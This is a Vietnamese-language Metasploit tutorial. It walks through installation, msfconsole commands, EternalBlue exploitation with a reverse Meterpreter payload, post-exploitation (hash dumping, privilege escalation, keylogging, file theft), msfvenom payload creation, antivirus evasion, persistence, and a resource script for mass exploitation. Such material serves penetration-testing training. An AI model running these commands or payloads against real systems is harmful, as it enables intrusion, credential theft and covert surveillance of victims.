1. Metasploit Framework là gì?

    Metasploit là framework pentest nổi tiếng nhất thế giới:

        Khai thác lỗ hổng (exploit), gửi payload (meterpreter/shell/reverse), tự động hóa attack

        Module post-exploitation: nâng quyền, dump hash, pivot, persistence, lập trình automation, evasion...

        Multi-platform: Linux, Windows, macOS, Android.

        Hơn 2000 exploit, 1000+ payload, 500+ auxiliary (scan, fuzz, brute-force...)

        API mạnh, tích hợp msfvenom, script hóa Ruby, Python, auto-report

2. Cài đặt Metasploit Framework
A. Kali/Ubuntu/Debian

sudo apt update
sudo apt install metasploit-framework

B. Cài bản mới nhất (khuyên dùng)

curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sudo bash

C. Kiểm tra phiên bản

msfconsole --version

3. Khởi động Metasploit (msfconsole) – CLI chính

sudo msfconsole

    Hiện banner “Metasploit” — CLI tương tác, giống msf của Kali.

4. Các lệnh cơ bản (msfconsole)
Lệnh	Ý nghĩa
search <từ khóa>	Tìm module exploit, payload, auxiliary
use <tên module>	Chọn module để exploit/scan/post-exploit
show exploits	Liệt kê exploit có trong framework
show payloads	Liệt kê payload (reverse, shell, meterpreter...)
show options	Xem cấu hình cần thiết cho module đã chọn
set <option> <giá trị>	Cấu hình option (RHOSTS, LHOST, ... )
run/exploit	Thực thi exploit
sessions	Quản lý session đã khai thác được
background	Đưa phiên làm việc vào background
jobs	Liệt kê job đang chạy (auxiliary, handler...)
exit	Thoát msfconsole
5. Workflow khai thác lỗ hổng thực chiến với Metasploit
A. Information Gathering (scan, recon)

    Dùng module auxiliary hoặc ngoài:

    use auxiliary/scanner/portscan/tcp
    set RHOSTS 192.168.1.100
    run

        Hoặc ngoài: nmap -sV -A 192.168.1.100 --script vuln

B. Tìm & chọn exploit

search smb
use exploit/windows/smb/ms17_010_eternalblue

C. Cấu hình exploit & payload

show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10   # IP máy bạn để nhận kết nối
set PAYLOAD windows/x64/meterpreter/reverse_tcp

D. Khai thác (exploit)

run
# Hoặc: exploit

    Khi khai thác thành công sẽ nhận shell hoặc Meterpreter session.

E. Post-exploitation (sau khi chiếm máy)

sessions            # Xem session đã có
sessions -i 1       # Tương tác với session 1
sysinfo             # Xem thông tin hệ thống
getuid              # Xem quyền
hashdump            # Dump hash Windows
getsystem           # Lên quyền SYSTEM (nếu được)
download <file>     # Tải file từ victim
upload <file>       # Gửi file lên victim
screenshot          # Chụp màn hình
keyscan_start       # Keylogger

    Dùng lệnh background để về background, khai thác tiếp target khác.

6. Phát triển & sử dụng payload nâng cao (msfvenom)
A. Tạo payload tùy chỉnh

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP bạn> LPORT=4444 -f exe > shell.exe

    Có thể tạo nhiều định dạng: exe, elf, apk, dll, powershell, js, war, jar, v.v.

    Tùy chọn encode:

    msfvenom -p ... -e x86/shikata_ga_nai -i 5 -f exe > evilshell.exe

B. Bypass AV/EDR (cơ bản)

    Encode nhiều lần, packer, chỉnh option, obfuscate (cơ bản).

    Kết hợp với Veil, Shellter, Donut, hoặc custom loader.

    Lập trình loader bằng C/C++, Powershell, VBA macro, HTA, JS...

7. Module nâng cao & post-exploitation thực chiến
A. Persistence

    Module: windows/manage/persistence, post/windows/manage/persistence_exe

    Duy trì truy cập khi máy restart.

B. Pivoting (qua máy trung gian)

    Sử dụng Meterpreter’s portfwd, autoroute để khai thác mạng nội bộ phía sau victim.

C. Lateral movement

    exploit/windows/smb/psexec, ms17_010_psexec, wmi_exec, v.v.

D. Dump credential & hash

    Module post/windows/gather/credentials/, post/multi/gather/

    Thường kết hợp với Mimikatz qua Meterpreter.

E. Screenshot, webcam, keylogger

    Module: post/windows/capture/screenshot, webcam_list, keyscan_start...

F. Automation, scripting, API

    Tích hợp msgrpc, Python, Ruby, Metasploit API, auto exploit nhiều host, script brute force.

8. Một số automation/workflow mạnh & script hóa

    Resource script (.rc):

        Tạo file script chứa lệnh msfconsole, tự động khai thác hàng loạt:

        use exploit/windows/smb/ms17_010_eternalblue
        set RHOSTS file:targets.txt
        set LHOST 192.168.1.10
        run -j

        Chạy: msfconsole -r myscript.rc

    API/Remote MSF:

        Dùng msfrpcd, Metasploit Web Service để script exploit từ xa, automation với Python/Ruby.

    Kết hợp với Nmap/Vulners để auto detect + exploit.

9. Fix lỗi thực chiến
Lỗi	Cách xử lý
Không khai thác được	Đúng version hệ điều hành, check target info, firewall/AV/EDR
Payload không connect về	NAT, port bị block, LHOST sai, thử reverse_https, reverse_dns, tăng timeout
Không lên quyền	Dùng post-exploit khác (bypassuac, getsystem, printspoofer, LPE...), scan thêm CVE
Shell không ổn định	Dùng payload staged, stageless, change handler, check AV
Dump hash lỗi	Thiếu quyền, run getsystem trước, chạy as admin
Lỗi session timeout	Set KeepAlive, tăng sleep, network ổn định
AV detect payload	Dùng encode, loader, đổi payload, tự viết dropper, dùng Veil/Shellter
10. So sánh Metasploit với các framework khác
Tool	Ưu điểm Metasploit	Khác biệt
Metasploit	Lớn nhất, module nhiều, automation tốt, post-exploit mạnh	Payload cũ dễ bị detect AV, không stealth như Cobalt Strike
Cobalt Strike	Pro, stealth, workflow red team mạnh, Beacon	Thương mại, đắt, không nhiều module khai thác
Empire	C2, post-exploit mạnh, PowerShell, Python	Không chuyên khai thác exploit, dùng cho post-exploit
Armitage	GUI hóa Metasploit	Không nhiều feature hơn CLI
Nmap NSE	Scan, fuzz, detect, tự động hóa	Không exploit/phát triển payload mạnh như MSF
11. Tài liệu, link hữu ích

    Metasploit Docs

    OffSec – Metasploit Unleashed

    PayloadAllTheThings – Post Exploit

    Hacktricks – Metasploit

    Awesome Metasploit

    Veil Framework

    Shellter

Tóm tắt nhanh

    Metasploit Framework: tool pentest số 1, khai thác, tạo payload, post-exploit, pivot, automation, reporting, scripting, API, tích hợp mọi công cụ red team hiện đại.

    Dùng đúng version, custom payload, encode, loader, pivot mạnh, quản lý nhiều session, post-exploit (dump hash, persistence, keylog...), script hóa bằng resource/API.

    Kết hợp với Empire, Cobalt Strike, Veil, Armitage, Nmap… để hoàn thiện workflow pentest, audit, red team.

